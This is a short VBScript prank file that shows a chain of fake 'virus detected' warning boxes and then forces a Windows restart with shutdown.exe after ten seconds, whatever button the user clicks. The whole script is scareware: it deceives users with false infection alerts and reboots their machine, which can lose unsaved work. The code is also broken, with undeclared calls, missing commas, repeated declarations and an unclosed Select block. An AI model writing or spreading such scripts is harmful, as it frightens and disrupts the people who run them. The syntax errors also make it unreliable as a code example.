Option Explicit

msg1=msgbox("A virus has been detected, and this file has been disabled.", 0+16, "Virus detected.")

msg2=msgbox("Would you like to delete this file?", 4+64, "Virus detected.")

Select Case msg2

Case vbYes
	msg3=msgbox("This file is very dangerous, virus deleted.", 0+64, "Virus deleting...")
	msg4=msgbox("WARNING: Virus could not be deleted.", 0+16, "Virus")
	msg5=msgbox("Virus forcing shutdown. Retry deletion, or try to abort?", 2+16, "Forcing shutdown")

	Select Case msg5
	
	Case vbAbort
		msg6("Could not abort. Shutting down in 10 seconds", 0+16 "Could not abort. Shutting down.")
		Dim objShell
        	Set objShell = WScript.CreateObject("WScript.Shell")
        	objShell.Run "C:\WINDOWS\system32\shutdown.exe -r -t 10"
		
	Case vbRetry
		msg7("Trying to delete file.", 0+16 "Retrying deletion.")
		msg8("Deletion failed. Shutting down in 10 seconds", 0+16 "Could not delete. Shutting down.")
		Dim objShell
        	Set objShell = WScript.CreateObject("WScript.Shell")
        	objShell.Run "C:\WINDOWS\system32\shutdown.exe -r -t 10"
	
	Case vbIgnore
		msg8("Message ignored, shutting down in 10 seconds", 0+16 "Shutting down.")
		Dim objShell
        	Set objShell = WScript.CreateObject("WScript.Shell")
        	objShell.Run "C:\WINDOWS\system32\shutdown.exe -r -t 10"

Case vbNo
	msg9=msgbox("Virus has taken over", 0+64, "Virus")
	msg10=msgbox("Shutting down in 10 seconds.", 2+64, "Shutting down.")
	Dim objShell
        	Set objShell = WScript.CreateObject("WScript.Shell")
        	objShell.Run "C:\WINDOWS\system32\shutdown.exe -r -t 10"
	